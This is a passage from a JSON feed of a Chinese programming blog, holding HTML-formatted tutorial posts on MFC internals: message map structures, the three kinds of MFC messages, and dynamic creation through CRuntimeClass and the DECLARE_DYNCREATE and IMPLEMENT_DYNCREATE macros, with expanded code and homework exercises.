data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">OnLButtonDown</span><span class=\"token punctuation\">(</span>UINT nFlags<span class=\"token punctuation\">,</span> CPoint point<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">AfxMessageBox</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello Message!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>从 MFC 的源码中我们可以发现 <code>AFX_MSGMAP_ENTRY</code>  结构数组的最后一个成员全是 <code>0</code> 。</p>\n<p>此外还有另一个结构体  <code>AFX_MSGMAP</code></p>\n<h2 id=\"结构体-afx_msgm\"><a class=\"anchor\" href=\"#结构体-afx_msgm\">#</a> 结构体 AFX_MSGM</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">AFX_MSGMAP</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>PASCAL<span class=\"token operator\">*</span> pfnGetBaseMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_MSGMAP_ENTRY<span class=\"token operator\">*</span> lpEntries<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这个结构体有两个成员，一个是指向其父类的 <code>GetThisMessageMap</code>  的函数指针，另一个是指向 当前的 <code>AFX_MSGMAP_ENTRY</code>  结构体的指针。</p>\n<h1 id=\"mfc的三大类消息\"><a class=\"anchor\" href=\"#mfc的三大类消息\">#</a> MFC 的三大类消息</h1>\n<ol>\n<li>标准消息</li>\n</ol>\n<p>任何以 WM 打头的消息都属于标准消息 (除 WM_COMMAND) 以外。<br />\n这类消息的响应函数名都被 MFC 规定好了。</p>\n<ol start=\"2\">\n<li>WM_COMMAND 命令消息</li>\n</ol>\n<p>这是来自菜单、工具条按钮、加速键等用户接口对象的 WM_COMMAND 通知消息，属于应用程序自己定义的消息。通过消息映射机制，MFC 框架把命令按一定的路径分发给多种类型的对象（具备消息处理能力）处理，如文档、窗口、应用程序、文档模板等对象。</p>\n<ol start=\"3\">\n<li>控件通知</li>\n</ol>\n<p>通常，控件通知在某些重要事件发生时，由控件窗口发送到父窗口，如打开一个组合框。控件通知为父窗口进一步控制子窗口提供了机会。例如，打开一个组合框时，父窗口可以用组合框初建时得不到的消息填充它。</p>\n<p>BN_XXXX 是 CButton 产生的消息，EN_XXXX 是 CEdit 产生的消息，等等。</p>\n<p>好多消息都还没有学，后面会学习的，暂时有个大概的理解。</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>消息映射的内部实现将在 MFC 的命令传递中详细的学习。</p>\n<p>这里需要记住<strong>能处理消息映射的类必须从  <code>CCmdTarget</code>  类派生。</strong>，可以一层一层的跟一下 MFC 源码。</p>\n<p>另外学习 MFC 的核心机制，就是学习微软的程序设计，学习它的设计思想。</p>\n<h1 id=\"课后作业\"><a class=\"anchor\" href=\"#课后作业\">#</a> 课后作业</h1>\n<ol>\n<li>新建一个类，继承于 CMainWnd (CNewWnd)</li>\n<li>给 CMainWnd 添加 鼠标左键点击事件 创建进新的 CNewWnd 窗口。</li>\n<li>给新的窗口添加鼠标右键事件 弹出 MessageBox</li>\n</ol>\n<p>不难。</p>\n",
            "tags": [
                "MFC消息映射",
                "结构体AFX_MSGMAP_ENTRY",
                "结构体AFX_MSGM",
                "MFC的三大类消息"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-03%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-03%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA/",
            "title": "MFC六大核心机制-03动态创建",
            "date_published": "2022-05-22T09:10:10.000Z",
            "content_html": "<h1 id=\"为什么要有动态创建\"><a class=\"anchor\" href=\"#为什么要有动态创建\">#</a> 为什么要有动态创建？</h1>\n<p>面向对象术语中有一个名为 persistence，意思是永久保存。 放在 RAM 中的东西， 生命受到电力的左右， 不可能永久保存； 唯一的办法是把它写到文件去。</p>\n<p>看起来永久保存与本节的主题「动态生成」 似乎没有什么干连。 有！ 你把你的数据储存到文件， 这些数据很可能（通常是） 对象中的成员变量； 我把它读出来后， 势必要依据文件上的记载， 重新 new 出那些个对象来。 问题在于， 即使我的程序有那些类定义（就算我的程序和你的程序有一样的内容好了） ， 我能够这么做吗：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> className<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">getClassName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 从文件（或使用者输入） 获得一个类名称</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>CObject<span class=\"token operator\">*</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> classname<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这一行行不通</span></pre></td></tr></table></figure><p>首先，  <code>new classname</code>  这个动作就过不了关。 其次， 就算过得了关， new 出来的对象究竟该是什么类类型？</p>\n<p>但我就是没办法恢复你原来的状态 —— 除非我的程序能够「动态生成」。MFC 支持动态生成， 靠的是一组的宏（  <code>DECLARE_DYNCREATE</code>  和  <code>IMPLEMENT_DYNCREATE</code>  ） 和  <code>CRuntimeClass</code>  类。</p>\n<h1 id=\"本节需要掌握的知识点\"><a class=\"anchor\" href=\"#本节需要掌握的知识点\">#</a> 本节需要掌握的知识点</h1>\n<p>1、本节必须掌握的知识点</p>\n<p>动态创建的作用</p>\n<p>二个关键的宏:</p>\n<p><code>DECLARE_DYNCREATE</code> <br />\n <code>IMPLEMENT_DYNCREATE</code></p>\n<p>2、需要简单了解的内容</p>\n<p><code>CRuntimeClass::CreateObject</code> （动态创建函数）</p>\n<h1 id=\"动态创建\"><a class=\"anchor\" href=\"#动态创建\">#</a> 动态创建</h1>\n<p>动态创建就是为了在程序执行期间动态获得的一个类名称。</p>\n<p>首先继续查看  <code>CRuntimeclass</code>  结构体:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">CRuntimeClass</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Attributes</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tLPCSTR m_lpszClassName<span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 类名称</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">int</span> m_nObjectSize<span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 类的大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tUINT m_wSchema<span class=\"token punctuation\">;</span> \t\t\t\t<span class=\"token comment\">// 加载类的模式编号</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tCObject<span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>PASCAL<span class=\"token operator\">*</span> m_pfnCreateObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 函数指针，定义了一个函数指针 m_pfnCreateObject 用来存放需要支持动态创建类的 CreateObject 函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_AFXDLL</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>PASCAL<span class=\"token operator\">*</span> m_pfnGetBaseClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> m_pBaseClass<span class=\"token punctuation\">;</span>  \t<span class=\"token comment\">// 父类指针</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// Operations</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tCObject<span class=\"token operator\">*</span> <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 动态创建函数</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tBOOL <span class=\"token function\">IsDerivedFrom</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> CRuntimeClass<span class=\"token operator\">*</span> pBaseClass<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 判断函数，判断是否父类</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token comment\">// dynamic name lookup and creation</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">FromName</span><span class=\"token punctuation\">(</span>LPCSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">FromName</span><span class=\"token punctuation\">(</span>LPCWSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span>LPCSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span>LPCWSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// Implementation</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token function\">Store</span><span class=\"token punctuation\">(</span>CArchive<span class=\"token operator\">&amp;</span> ar<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">Load</span><span class=\"token punctuation\">(</span>CArchive<span class=\"token operator\">&amp;</span> ar<span class=\"token punctuation\">,</span> UINT<span class=\"token operator\">*</span> pwSchemaNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token comment\">// CRuntimeClass objects linked together in simple list</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> m_pNextClass<span class=\"token punctuation\">;</span>        \t<span class=\"token comment\">// 指向下一个 CRuntimeClass 结构体指针</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_CLASSINIT<span class=\"token operator\">*</span> m_pClassInit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其中我们用的到的就是：</p>\n<p><code>CObject* (PASCAL* m_pfnCreateObject)(); // 函数指针，定义了一个函数指针m_pfnCreateObject用来存放需要支持动态创建类的CreateObject函数</code> <br />\n <code>CObject* CreateObject();  // 动态创建函数</code></p>\n<h2 id=\"使用动态创建\"><a class=\"anchor\" href=\"#使用动态创建\">#</a> 使用动态创建</h2>\n<p>跟进  <code>CFramWnd</code>  类、  <code>CWinApp</code>  类来看一下谁支持动态创建，也就是谁使用了相关的宏：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CWinApp</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CWinThread</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">DECLARE_DYNAMIC</span><span class=\"token punctuation\">(</span>CWinApp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Public<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CFrameWnd</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CWnd</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">DECLARE_DYNCREATE</span><span class=\"token punctuation\">(</span>CFrameWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p><code>CFrameWnd</code>  类使用了  <code>DECLARE_DYNCREATE</code>  宏，也就表示其支持动态创建。</p>\n<p>所以我们可以在其派生的  <code>CMainWindow</code>  类也使用动态创建，这里宏的使用和 RTTI 宏的使用是一样的。<br />\n在类中添加如下语句  <code>DECLARE_DYNCREATE(CMainWindow)</code> <br />\n 在类外  <code>IMPLEMENT_DYNCREATE(CMainWindow, CFrameWnd);</code></p>\n<p>然后在  <code>CMyApp::InitInstance()</code>  函数中把  <code>m_pMainWnd = new CMainWindow;</code>  替换成  <code>m_pMainWnd = (CWnd*)(RUNTIME_CLASS(CMainWindow)-&gt;CreateObject());</code></p>\n<p>运行程序，窗口正常创建出来了。</p>\n<p>接下来分析一下动态创建用的宏。</p>\n<h2 id=\"宏declare_dyncreate\"><a class=\"anchor\" href=\"#宏declare_dyncreate\">#</a> 宏 DECLARE_DYNCREATE</h2>\n<p>在 VS2019 中跟进一下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">DECLARE_DYNCREATE</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">DECLARE_DYNAMIC</span><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>发现宏  <code>DECLARE_DYNAMIC</code>  这说明动态创建也支持 RTTI。</p>\n<p>以  <code>DECLARE_DYNCREATE(CMainWindow);</code>  为例，将其展开：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> CRuntimeClass classCMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> __stdcall <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"宏implement_dyncreate\"><a class=\"anchor\" href=\"#宏implement_dyncreate\">#</a> 宏 IMPLEMENT_DYNCREATE</h2>\n<p>在 VS2019 中跟进一下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">IMPLEMENT_DYNCREATE</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">,</span> base_class_name<span class=\"token punctuation\">)</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token expression\">CObject<span class=\"token operator\">*</span> PASCAL class_name<span class=\"token operator\">::</span><span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token expression\"><span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> class_name<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token expression\"><span class=\"token function\">IMPLEMENT_RUNTIMECLASS</span><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">,</span> base_class_name<span class=\"token punctuation\">,</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">,</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token expression\">class_name<span class=\"token operator\">::</span>CreateObject<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr></table></figure><p>发现其  <code>IMPLEMENT_RUNTIMECLASS</code>  与前面使用 RTTI 时的第四个参数不一样了。</p>\n<p>以  <code>IMPLEMENT_DYNCREATE(CMainWindow, CFrameWnd);</code>  为例，将其展开：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CObject<span class=\"token operator\">*</span> __stdcall <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> CMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">__declspec</span><span class=\"token punctuation\">(</span>selectany<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> CRuntimeClass CMainWindow<span class=\"token operator\">::</span>classCMainWindow <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token string\">\"CMainWindow\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tCMainWindow<span class=\"token operator\">::</span>CreateObject<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>CFrameWnd<span class=\"token operator\">::</span>classCFrameWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>CMainWindow<span class=\"token operator\">::</span>classCMainWindow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"分析动态创建\"><a class=\"anchor\" href=\"#分析动态创建\">#</a> 分析动态创建</h2>\n<p>分析一下  <code>CMyApp::InitInstance()</code>  函数中的  <code>m_pMainWnd = (CWnd*)(((CRuntimeClass*)(&amp;CMainWindow::classCMainWindow))-&gt;CreateObject());</code></p>\n<p>在 VS2019 中下断点跟进查看：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CObject<span class=\"token operator\">*</span> <span class=\"token class-name\">CRuntimeClass</span><span class=\"token operator\">::</span><span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">ENSURE</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_pfnCreateObject <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token function\">TRACE</span><span class=\"token punctuation\">(</span>traceAppMsg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: Trying to create object which is not \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DECLARE_DYNCREATE \\nor DECLARE_SERIAL: %hs.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tm_lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tCObject<span class=\"token operator\">*</span> pObject <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tTRY</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tpObject <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>m_pfnCreateObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tEND_TRY</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">return</span> pObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>先进入了  <code>CRuntimeClass::CreateObject()</code>  然后调用了函数指针  <code>pObject = (*m_pfnCreateObject)();</code>  既调用了我们的  <code>CreateObject</code>  函数。</p>\n<p>设计的非常巧妙。</p>\n<h2 id=\"课后作业\"><a class=\"anchor\" href=\"#课后作业\">#</a> 课后作业</h2>\n<p>在 CMainWindow 里面定义一个函数。<br />\n <code>CreateObjectByName(THCAR* ClassName)</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token 